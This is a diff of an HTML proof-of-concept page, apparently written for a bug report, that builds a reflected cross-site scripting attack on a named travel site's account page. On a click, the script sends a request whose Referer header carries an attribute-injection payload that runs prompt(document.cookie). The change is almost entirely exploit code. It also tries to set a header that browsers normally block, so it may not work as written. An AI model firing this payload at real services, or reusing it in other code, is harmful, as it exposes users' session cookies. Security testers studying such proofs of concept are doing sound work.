@@ -1,9 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Payload</title>
+    <title>XSS Trigger</title>
 </head>
 <body>
-    <script>alert('XSS PoC');</script>
+    <a href="#" id="xssLink">Click me</a>
+
+    <script>
+    document.getElementById("xssLink").addEventListener("click", function() {
+        // Construct the URL with the malicious Referer header
+        var url = "http://travelpirates.hometogo.com/account/";
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.setRequestHeader("Referer", 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss');
+        xhr.send();
+    });
+    </script>
 </body>
 </html>
